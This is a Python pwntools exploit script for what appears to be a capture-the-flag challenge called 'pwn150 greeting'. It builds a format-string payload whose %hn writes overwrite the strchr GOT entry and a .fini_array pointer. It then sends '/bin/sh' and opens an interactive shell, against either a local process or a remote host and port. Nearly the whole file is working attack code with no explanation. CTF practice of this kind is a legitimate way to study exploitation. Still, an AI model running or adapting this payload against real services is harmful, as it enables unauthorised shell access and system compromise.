#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.recvuntil('Please tell me your name...')

	payload  = 'AA'
	payload += '%202'		# 12th
	payload += '6xCC'		# 0x8049a50 strchr target 0x8048779 0x8048490
	payload += p32(0x8049a52)
	payload += '%14$'
	payload += 'hnEE'
	payload += '%318'
	payload += '77xA'
	payload += p32(0x8049a50)
	payload += '%19$'
	payload += 'hnAA'

	payload += '%340'
	payload += 'xBBB'
	payload += p32(0x8049934)	# fini 0x080485a0 target 0x80485ed
	payload += '%24$'
	payload += 'hhnA'

	print len(payload)
	r.sendline(payload)

	r.sendline('/bin/sh\x00')
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/pwn150/greeting'])
        print util.proc.pidof(r)
        pause()
        exploit(r)